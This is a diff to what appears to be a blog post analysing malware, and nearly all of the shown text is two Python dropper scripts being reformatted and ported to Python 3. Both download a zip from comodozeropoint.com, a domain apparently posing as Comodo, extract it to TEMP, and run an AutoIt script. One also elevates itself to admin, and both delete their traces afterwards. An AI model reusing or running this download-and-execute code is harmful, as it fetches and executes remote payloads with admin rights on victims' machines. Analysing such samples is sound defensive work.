@@ -135,7 +135,8 @@ import shutil
 import ctypes
 import sys
 
-class disable_file_system_redirection:
+
+class DisableFileSystemRedirection:
     _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
     _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
 
@@ -147,119 +148,122 @@ class disable_file_system_redirection:
         if self.success:
             self._revert(self.old_value)
 
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
+    except Exception:
         return False
+
 
 def run_as_admin(command, params):
     try:
         if not is_admin():
-            # Restart the script with admin rights
-            params = \' \'.join(params)
-            print(\"Restarting script with admin rights...\")
-            ctypes.windll.shell32.ShellExecuteW(None, \"runas\", command, params, None, 1)
+            print("Restarting script with admin rights...")
+            params = ' '.join(params)
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", command, params, None, 1)
             sys.exit(0)
         else:
-            print(\"Running command with admin rights:\", command, params)
+            print("Running command with admin rights:", command, params)
             result = subprocess.call([command] + params, shell=True)
             if result != 0:
-                print(\"Command failed with return code:\", result)
+                print("Command failed with return code:", result)
             else:
-                print(\"Command executed successfully.\")
+                print("Command executed successfully.")
     except Exception as e:
-        print(\"Failed to elevate to admin. Error:\", e)
+        print("Failed to elevate to admin. Error:", e)
         sys.exit(1)
+
 
 def download_file(url, save_path):
     try:
         request = urllib.urlopen(url)
-        with open(save_path, \'wb\') as f:
+        with open(save_path, 'wb') as f:
             while True:
-                chunk = request.read(100 * 1000 * 1000)
+                chunk = request.read(100 * 1000 * 1000)  # 100 MB chunks
                 if not chunk:
                     break
                 f.write(chunk)
-        print(\"File downloaded successfully and saved to {}.\".format(save_path))
-        # Check file size
+        print("File downloaded successfully and saved to {}.".format(save_path))
         file_size = os.path.getsize(save_path)
-        print(\"Downloaded file size: {} bytes.\".format(file_size))
+        print("Downloaded file size: {} bytes.".format(file_size))
     except Exception as e:
-        print(\"Error downloading file: \", e)
+        print("Error downloading file:", e)
         sys.exit(1)
+
 
 def unzip_file(zip_path, extract_to):
     try:
-        with disable_file_system_redirection():
-            with zipfile.ZipFile(zip_path, \'r\') as zip_ref:
+        with DisableFileSystemRedirection():
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                 zip_ref.extractall(extract_to)
-                print(\"File extracted successfully to {}\".format(extract_to))
+                print("File extracted successfully to {}".format(extract_to))
     except zipfile.BadZipFile:
-        print(\"File is not a valid zip file\")
+        print("File is not a valid zip file")
     except Exception as e:
-        print(\"Error extracting file: \", e)
+        print("Error extracting file:", e)
         sys.exit(1)
+
 
 def cleanup(file_path, folder_path):
     try:
         if os.path.exists(file_path):
             os.remove(file_path)
-            print(\"Removed file: {}\".format(file_path))
+            print("Removed file: {}".format(file_path))
         if os.path.exists(folder_path):
             shutil.rmtree(folder_path)
-            print(\"Removed folder: {}\".format(folder_path))
+            print("Removed folder: {}".format(folder_path))
     except Exception as e:
-        print(\"Error during cleanup: \", e)
+        print("Error during cleanup:", e)
 
-if __name__ == \"__main__\":
+
+if __name__ == "__main__":
     command = sys.executable
     params = sys.argv
 
     run_as_admin(command, params)
 
-    zip_url = \'http://comodozeropoint.com/Updates/1736162964/23/Salome.zip\'
+    zip_url = 'http://comodozeropoint.com/Updates/1736162964/23/Salome.zip'
     zip_filename = os.path.basename(zip_url)
     folder_name = os.path.splitext(zip_filename)[0]
 
-    temp_folder = os.path.join(os.environ[\'TEMP\'], folder_name)
-    zip_path = os.path.join(os.environ[\'TEMP\'], zip_filename)
+    temp_folder = os.path.join(os.environ['TEMP'], folder_name)
+    zip_path = os.path.join(os.environ['TEMP'], zip_filename)
     extract_to = temp_folder
 
-    if not os.path.exists(os.environ[\'TEMP\']):
-        os.makedirs(os.environ[\'TEMP\'])
+    if not os.path.exists(os.environ['TEMP']):
+        os.makedirs(os.environ['TEMP'])
 
-    print(\"Downloading file...\")
+    print("Downloading file...")
     download_file(zip_url, zip_path)
 
     if os.path.exists(zip_path):
-        print(\"File exists after download.\")
+        print("File exists after download.")
     else:
-        print(\"File did not download successfully.\")
+        print("File did not download successfully.")
         exit()
 
     if not os.path.exists(extract_to):
         os.makedirs(extract_to)
 
-    print(\"Extracting file...\")
+    print("Extracting file...")
     unzip_file(zip_path, extract_to)
 
-    # \331\205\330\263\333\214\330\261 \332\251\330\247\331\205\331\204 \330\250\331\207 AutoIt3.exe \331\210 script.a3x \331\276\330\263 \330\247\330\262 \330\247\330\263\330\252\330\256\330\261\330\247\330\254
-    autoit_path = os.path.join(extract_to, \'AutoIt3.exe\')
-    script_path = os.path.join(extract_to, \'script.a3x\')
+    autoit_path = os.path.join(extract_to, 'AutoIt3.exe')
+    script_path = os.path.join(extract_to, 'script.a3x')
 
-    print(\"Running command...\")
+    print("Running command...")
     if os.path.exists(autoit_path) and os.path.exists(script_path):
         run_as_admin(autoit_path, [script_path])
     else:
-        print(\"Error: AutoIt3.exe or script.a3x not found after extraction.\")
+        print("Error: AutoIt3.exe or script.a3x not found after extraction.")
 
     time.sleep(60)
 
-    print(\"Cleaning up...\")
+    print("Cleaning up...")
     cleanup(zip_path, extract_to)
 
-    print(\"Done\")
+    print("Done")
 
 {% endhighlight %}
 
@@ -317,20 +321,21 @@ The cleaned-up Python script:
 {% highlight python %}
 
 import os
-import urllib2
+import urllib.request
 import zipfile
 import subprocess
 import shutil
 import ctypes
 import time
 
-class disable_file_system_redirection:
+class FileSystemRedirection:
     _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
     _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
 
     def __enter__(self):
         self.old_value = ctypes.c_long()
         self.success = self._disable(ctypes.byref(self.old_value))
+        return self.success
 
     def __exit__(self, type, value, traceback):
         if self.success:
@@ -338,36 +343,38 @@ class disable_file_system_redirection:
 
 def download_file(url, save_path):
     try:
-        headers = {\'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\'}
-        request = urllib2.Request(url, headers=headers)
-        response = urllib2.urlopen(request)
-        with open(save_path, \'wb\') as f:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        request = urllib.request.Request(url, headers=headers)
+        response = urllib.request.urlopen(request)
+        with open(save_path, 'wb') as f:
             f.write(response.read())
-        print(\"File downloaded successfully.\")
-    except urllib2.HTTPError as e:
-        print(\"HTTP Error: \", e.code)
-    except urllib2.URLError as e:
-        print(\"URL Error: \", e.reason)
+        print("File downloaded successfully.")
+    except urllib.error.HTTPError as e:
+        print("HTTP Error:", e.code)
+    except urllib.error.URLError as e:
+        print("URL Error:", e.reason)
     except Exception as e:
-        print(\"Error downloading file: \", e)
+        print("Error downloading file:", e)
 
 def unzip_file(zip_path, extract_to):
     try:
-        with disable_file_system_redirection():
-            with zipfile.ZipFile(zip_path, \'r\') as zip_ref:
+        with FileSystemRedirection():
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                 zip_ref.extractall(extract_to)
-                print(\"File extracted successfully.\")
-    except zipfile.BadZipfile:
-        print(\"File is not a zip file\")
+                print("File extracted successfully.")
+    except zipfile.BadZipFile:
+        print("File is not a zip file")
     except Exception as e:
-        print(\"Error extracting file: \", e)
+        print("Error extracting file:", e)
 
 def run_command(command, cwd):
     try:
         proc = subprocess.Popen(command, shell=True, cwd=cwd)
         proc.communicate()
     except Exception as e:
-        print(\"Error running command: \", e)
+        print("Error running command:", e)
 
 def cleanup(file_path, folder_path):
     try:
@@ -376,46 +383,46 @@ def cleanup(file_path, folder_path):
         if os.path.exists(folder_path):
             shutil.rmtree(folder_path)
     except Exception as e:
-        print(\"Error during cleanup: \", e)
+        print("Error during cleanup:", e)
 
-if __name__ == \"__main__\":
-    zip_url = \'http://comodozeropoint.com/Requests/api/Core.zip\'
+if __name__ == "__main__":
+    zip_url = 'http://comodozeropoint.com/Requests/api/Core.zip'
     zip_filename = os.path.basename(zip_url)
     folder_name = os.path.splitext(zip_filename)[0]
 
-    temp_folder = os.path.join(os.environ[\'TEMP\'], folder_name)
-    zip_path = os.path.join(os.environ[\'TEMP\'], zip_filename)
+    temp_folder = os.path.join(os.environ['TEMP'], folder_name)
+    zip_path = os.path.join(os.environ['TEMP'], zip_filename)
     extract_to = temp_folder
 
-    if not os.path.exists(os.environ[\'TEMP\']):
-        os.makedirs(os.environ[\'TEMP\'])
+    if not os.path.exists(os.environ['TEMP']):
+        os.makedirs(os.environ['TEMP'])
 
-    print(\"Downloading file...\")
+    print("Downloading file...")
     download_file(zip_url, zip_path)
 
     if os.path.exists(zip_path):
-        print(\"File downloaded successfully.\")
+        print("File downloaded successfully.")
     else:
-        print(\"File did not download successfully.\")
+        print("File did not download successfully.")
         exit()
 
     if not os.path.exists(extract_to):
         os.makedirs(extract_to)
 
-    print(\"Extracting file...\")
+    print("Extracting file...")
     unzip_file(zip_path, extract_to)
 
-    print(\"Running command...\")
-    command = \'AutoIt3.exe script.a3x\'
+    print("Running command...")
+    command = 'AutoIt3.exe script.a3x'
     run_command(command, extract_to)
 
-    print(\"Waiting for 1 minute before cleanup...\")
+    print("Waiting for 1 minute before cleanup...")
     time.sleep(60)
 
-    print(\"Cleaning up...\")
+    print("Cleaning up...")
     cleanup(zip_path, extract_to)
 
-    print(\"Done\")
+    print("Done")
 
 {% endhighlight %}
 
